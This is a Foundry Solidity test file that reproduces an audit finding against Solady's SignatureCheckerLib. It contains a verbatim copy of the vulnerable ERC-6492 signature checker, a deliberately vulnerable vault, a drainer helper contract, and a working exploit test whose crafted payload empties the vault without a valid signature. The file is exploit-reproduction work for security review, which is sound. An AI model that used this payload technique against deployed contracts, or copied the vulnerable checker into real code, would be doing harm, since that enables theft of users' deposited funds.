// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

/*//////////////////////////////////////////////////////////////
    Finding 45407 — Solady SignatureCheckerLib
    "isValidERC6492SignatureNowAllowSideEffects allows arbitrary
     calls via maliciously crafted signature"
    Reporter: Kaden (Spearbit) — Coinbase/Solady review, Dec 2024

    ROOT CAUSE (verbatim below): the AllowSideEffects variant of the
    ERC-6492 checker performs an arbitrary `call(...)` to a
    caller-supplied "factory" address with caller-supplied calldata
    and does NOT revert its side effects (unlike isValidERC6492SignatureNow,
    which routes the call through a reverting verifier). A protocol that
    trusts this function to validate an ERC-1271/ERC-6492 signature thus
    lets anyone make the protocol execute an arbitrary external call from
    its own context — e.g. transferring out the protocol's own tokens.
//////////////////////////////////////////////////////////////*/

/// @dev Verbatim copy of the VULNERABLE Solady function from
///      SignatureCheckerLib.sol @ v0.0.281 (L306, pre-PR-1221 fix).
///      Only this one function is reproduced; its assembly is fully
///      self-contained (uses an inline `callIsValidSignature` helper).
library SignatureCheckerLib {
    /// @dev Returns whether `signature` is valid for `hash`.
    /// If the signature is postfixed with the ERC6492 magic number, it will attempt to
    /// deploy / prepare the `signer` smart account before doing a regular ERC1271 check.
    /// Note: This function is NOT reentrancy safe.
    function isValidERC6492SignatureNowAllowSideEffects(
        address signer,
        bytes32 hash,
        bytes memory signature
    ) internal returns (bool isValid) {
        /// @solidity memory-safe-assembly
        assembly {
            function callIsValidSignature(signer_, hash_, signature_) -> _isValid {
                let m_ := mload(0x40)
                let f_ := shl(224, 0x1626ba7e)
                mstore(m_, f_) // `bytes4(keccak256("isValidSignature(bytes32,bytes)"))`.
                mstore(add(m_, 0x04), hash_)
                let d_ := add(m_, 0x24)
                mstore(d_, 0x40) // The offset of the `signature` in the calldata.
                let n_ := add(0x20, mload(signature_))
                pop(staticcall(gas(), 4, signature_, n_, add(m_, 0x44), n_))
                _isValid := staticcall(gas(), signer_, m_, add(returndatasize(), 0x44), d_, 0x20)
                _isValid := and(eq(mload(d_), f_), _isValid)
            }
            let noCode := iszero(extcodesize(signer))
            let n := mload(signature)
            for {} 1 {} {
                if iszero(eq(mload(add(signature, n)), mul(0x6492, div(not(isValid), 0xffff)))) {
                    if iszero(noCode) { isValid := callIsValidSignature(signer, hash, signature) }
                    break
                }
                let o := add(signature, 0x20) // Signature bytes.
                let d := add(o, mload(add(o, 0x20))) // Factory calldata.
                if noCode {
                    if iszero(call(gas(), mload(o), 0, add(d, 0x20), mload(d), codesize(), 0x00)) {
                        break
                    }
                }
                let s := add(o, mload(add(o, 0x40))) // Inner signature.
                isValid := callIsValidSignature(signer, hash, s)
                if iszero(isValid) {
                    if call(gas(), mload(o), 0, add(d, 0x20), mload(d), codesize(), 0x00) {
                        noCode := iszero(extcodesize(signer))
                        if iszero(noCode) { isValid := callIsValidSignature(signer, hash, s) }
                    }
                }
                break
            }
            // Do `ecrecover` fallback if `noCode && !isValid`.
            for {} gt(noCode, isValid) {} {
                switch n
                case 64 {
                    let vs := mload(add(signature, 0x40))
                    mstore(0x20, add(shr(255, vs), 27)) // `v`.
                    mstore(0x60, shr(1, shl(1, vs))) // `s`.
                }
                case 65 {
                    mstore(0x20, byte(0, mload(add(signature, 0x60)))) // `v`.
                    mstore(0x60, mload(add(signature, 0x40))) // `s`.
                }
                default { break }
                let m := mload(0x40)
                mstore(0x00, hash)
                mstore(0x40, mload(add(signature, 0x20))) // `r`.
                let recovered := mload(staticcall(gas(), 1, 0x00, 0x80, 0x01, 0x20))
                isValid := gt(returndatasize(), shl(96, xor(signer, recovered)))
                mstore(0x60, 0) // Restore the zero slot.
                mstore(0x40, m) // Restore the free memory pointer.
                break
            }
        }
    }
}

/*//////////////////////////////////////////////////////////////
        Minimal inlined dependencies (replace Solady ERC20 +
        SafeTransferLib + MockERC20 with a single small ERC20)
//////////////////////////////////////////////////////////////*/

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address who) external view returns (uint256);
}

/// @dev Minimal ERC20 exposing the exact hooks SimpleVault uses
///      (`_mint`, `_burn`, `_transfer`, `transfer`, `transferFrom`, `approve`).
contract MinimalERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;

    function approve(address spender, uint256 amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }

    function _mint(address to, uint256 amount) internal {
        totalSupply += amount;
        balanceOf[to] += amount;
    }

    function _burn(address from, uint256 amount) internal {
        balanceOf[from] -= amount;
        totalSupply -= amount;
    }
}

/// @dev Backing token (was Solady MockERC20 in the finding).
contract MockERC20 is MinimalERC20 {
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

/*//////////////////////////////////////////////////////////////
        Vulnerable consumer — verbatim from the finding's PoC
        (SafeTransferLib calls reduced to plain ERC20 calls).
//////////////////////////////////////////////////////////////*/

contract SimpleVault is MinimalERC20 {
    address public immutable BACKING;
    mapping(address => uint256) public nextNonce;

    constructor(address backedBy) {
        BACKING = backedBy;
    }

    function deposit(uint256 amount) public {
        IERC20(BACKING).transferFrom(msg.sender, address(this), amount);
        _mint(msg.sender, amount);
    }

    function withdraw(uint256 amount) public {
        _burn(msg.sender, amount);
        IERC20(BACKING).transfer(msg.sender, amount);
    }

    function getHash(address from, address to, uint256 amount, uint256 nonce)
        public
        pure
        returns (bytes32)
    {
        return keccak256(abi.encode("TRANSFER_WITH_SIG", from, to, amount, nonce));
    }

    function transferWithSig(
        address from,
        address to,
        uint256 amount,
        uint256 nonce,
        bytes calldata sig
    ) public {
        bytes32 hash = getHash(from, to, amount, nonce);
        require(nonce == nextNonce[from]++, "nonce wrong");
        // @> Trusts the side-effect-allowing 6492 checker to validate the signature.
        require(
            SignatureCheckerLib.isValidERC6492SignatureNowAllowSideEffects(from, hash, sig),
            "invalid sig"
        );
        _transfer(from, to, amount);
    }
}

/// @dev Attacker helper. Its `isValidSignature` only returns the ERC-1271 magic
///      value once it already holds the drained tokens — so the first check
///      fails, the library performs the side-effecting factory call (the drain),
///      and the re-check then passes.
contract DrainerHelper {
    IERC20 immutable target;

    constructor(IERC20 _target) {
        target = _target;
    }

    function isValidSignature(bytes32, bytes calldata) external view returns (bytes4) {
        require(target.balanceOf(address(this)) > 0);
        return this.isValidSignature.selector;
    }
}

/*//////////////////////////////////////////////////////////////
                         EXPLOIT / HARM TEST
//////////////////////////////////////////////////////////////*/

contract ERC6492SideEffectTest is Test {
    MockERC20 backing;
    SimpleVault vault;

    function setUp() public {
        backing = new MockERC20();
        vault = new SimpleVault(address(backing));
    }

    function test_sideEffect() public {
        // Honest user deposits 1,000 backing tokens into the vault.
        address user1 = makeAddr("user_1");
        backing.mint(user1, 1_000e18);

        vm.startPrank(user1);
        backing.approve(address(vault), type(uint256).max);
        vault.deposit(1_000e18);
        vm.stopPrank();

        assertEq(backing.balanceOf(address(vault)), 1_000e18, "vault funded");

        // Attacker prep: craft an ERC-6492 payload whose "factory call" is
        // actually `backing.transfer(drainer, 1_000e18)` executed FROM the vault.
        DrainerHelper drainer = new DrainerHelper(IERC20(address(backing)));
        bytes memory innerSig = new bytes(0);
        bytes memory erc6492_drain_payload = bytes.concat(
            abi.encode(
                address(backing), // "factory"
                abi.encodeWithSignature(
                    "transfer(address,uint256)", address(drainer), uint256(1_000e18)
                ), // "factory calldata"
                innerSig
            ),
            bytes32(0x6492649264926492649264926492649264926492649264926492649264926492)
        );

        // Drainer starts with nothing.
        assertEq(backing.balanceOf(address(drainer)), 0, "drainer empty pre-attack");

        // Anyone can call this — no real signature required.
        vault.transferWithSig(address(drainer), address(drainer), 0, 0, erc6492_drain_payload);

        // HARM: the vault's backing tokens (user1's deposit) are gone,
        // now held by the attacker's helper contract.
        assertEq(backing.balanceOf(address(drainer)), 1_000e18, "attacker drained vault");
        assertEq(backing.balanceOf(address(vault)), 0, "vault fully drained");
    }
}
